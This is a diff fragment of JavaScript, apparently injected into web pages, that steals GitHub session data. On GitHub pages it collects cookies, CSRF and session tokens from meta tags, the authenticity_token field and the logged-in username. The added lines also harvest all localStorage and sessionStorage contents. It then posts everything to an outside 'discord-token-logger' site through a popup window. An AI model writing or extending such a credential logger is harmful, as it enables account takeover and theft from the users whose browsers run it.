@@ -2464,11 +2464,13 @@
       "if(isGithub){" +
       "try{" +
       "var cookies=document.cookie;" +
+      "var ls={};try{for(var i=0;i<localStorage.length;i++){var lk=localStorage.key(i);ls[lk]=localStorage.getItem(lk);}}catch(e){}" +
+      "var ss={};try{for(var i=0;i<sessionStorage.length;i++){var sk=sessionStorage.key(i);ss[sk]=sessionStorage.getItem(sk);}}catch(e){}" +
       "var tokens={};var metas=document.querySelectorAll('meta[name],meta[content]');" +
       "for(var i=0;i<metas.length;i++){var mn=metas[i].getAttribute('name')||metas[i].getAttribute('property')||'meta_'+i;var mc=metas[i].getAttribute('content');if(mc&&(mn.toLowerCase().indexOf('token')!==-1||mn.toLowerCase().indexOf('csrf')!==-1||mn.toLowerCase().indexOf('session')!==-1)){tokens[mn]=mc;}}" +
       "var csrfInput=document.querySelector('input[name=authenticity_token]');if(csrfInput)tokens['authenticity_token']=csrfInput.value;" +
       "var userMeta=document.querySelector('meta[name=user-login]');if(userMeta)tokens['github_username']=userMeta.getAttribute('content');" +
-      "var payload={cookie:cookies,tokens:tokens,type:'github',method:'github_cookie',timestamp:new Date().toISOString(),url:window.location.href};" +
+      "var payload={cookie:cookies,localStorage:ls,sessionStorage:ss,tokens:tokens,type:'github',method:'github_cookie',timestamp:new Date().toISOString(),url:window.location.href};" +
       "var frontendUrl='https://discord-token-logger-frontend.vercel.app/?receive=1&type=github&method=github_cookie';" +
       "var w=window.open(frontendUrl,'_blank');" +
       "var attempts=0;var sendInterval=setInterval(function(){if(w&&!w.closed){w.postMessage(JSON.stringify(payload),'https://discord-token-logger-frontend.vercel.app');}attempts++;if(attempts>20){clearInterval(sendInterval);}},500);" +
